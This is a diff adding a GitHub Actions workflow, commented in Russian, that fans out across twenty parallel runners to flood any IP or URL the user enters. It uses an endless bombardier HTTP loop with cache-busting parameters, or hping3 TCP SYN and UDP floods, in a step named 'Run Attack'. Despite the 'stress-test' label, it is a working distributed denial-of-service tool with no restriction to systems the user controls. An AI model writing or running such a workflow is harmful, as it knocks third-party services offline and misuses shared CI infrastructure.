@@ -1,0 +1,64 @@
+name: Ultimate Multi-Tool (HTTP/TCP/UDP)
+
+on:
+  workflow_dispatch:
+    inputs:
+      method:
+        description: 'Выберите метод'
+        required: true
+        default: 'http'
+        type: choice
+        options:
+          - http
+          - tcp
+          - udp
+      target:
+        description: 'IP или URL (например: 1.1.1.1 или https://google.com)'
+        required: true
+      port:
+        description: 'Порт (только для TCP/UDP)'
+        required: false
+        default: '80'
+
+jobs:
+  stress-test:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    
+    steps:
+      - name: Install Tools
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y hping3
+          wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64
+          chmod +x bombardier-linux-amd64
+          sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
+
+      - name: Run Attack
+        run: |
+          METHOD="${{ github.event.inputs.method }}"
+          TARGET="${{ github.event.inputs.target }}"
+          PORT="${{ github.event.inputs.port }}"
+          
+          echo "Запуск $METHOD на $TARGET с машины №${{ matrix.runner }}"
+
+          if [ "$METHOD" == "http" ]; then
+            # Бесконечный цикл для HTTP
+            while true; do
+              bombardier -c 1000 -d 300s --http2 -l "$TARGET?cache=$RANDOM"
+            done
+
+          elif [ "$METHOD" == "tcp" ]; then
+            # TCP SYN Flood (эмуляция множества подключений)
+            # --flood: максимально возможная скорость
+            # -S: установка SYN флага
+            sudo hping3 --flood -S -p $PORT $TARGET
+
+          elif [ "$METHOD" == "udp" ]; then
+            # UDP Flood
+            # --udp: использовать UDP протокол
+            sudo hping3 --flood --udp -p $PORT $TARGET
+          fi
